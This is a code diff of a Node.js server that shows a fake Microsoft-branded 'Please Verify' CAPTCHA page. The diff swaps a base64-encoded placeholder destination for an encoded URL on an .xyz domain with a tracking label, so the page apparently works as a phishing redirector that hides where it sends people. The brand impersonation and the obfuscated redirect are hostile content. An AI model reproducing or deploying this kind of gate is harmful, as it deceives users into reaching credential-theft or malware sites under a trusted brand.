@@ -3,7 +3,7 @@ const http = require('http');
 const crypto = require('crypto');
 
 // Base64-encoded target URL
-const base64Url = "aHR0cHM6Ly9nb29nbGUuY29tLw=="; // Example: "https://www.yourdestinationurl.com"
+const base64Url = "aHR0cHM6Ly9ibGFuZHNvbmxkbi54eXo/bGFiZWw9M2IwNTBmZmJhYjY1NzA0Yjg2OGE1MmQ1M2MwODgzMDY="; // Example: "https://www.yourdestinationurl.com"
 
 // Store CAPTCHA data
 const captchaStore = {};
@@ -111,9 +111,9 @@ http.createServer((req, res) => {
             <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
           </div>
           <div class="title">Please Verify</div>
-          <div class="subtitle">We need to confirm that you’re not a robot before proceeding. Please solve the CAPTCHA below.</div>
+          <div class="subtitle">We need to confirm that you are not a robot before proceeding. Please solve the CAPTCHA below.</div>
           <form method="POST" action="/verify" class="captcha-form">
-            <label>${num1} + ${num2} = </label>
+            <label>${num1} + ${num2} </label>
             <input type="text" name="captcha" placeholder="Enter your answer" required>
             <input type="hidden" name="captchaId" value="${captchaId}">
             <button type="submit">Continue</button>
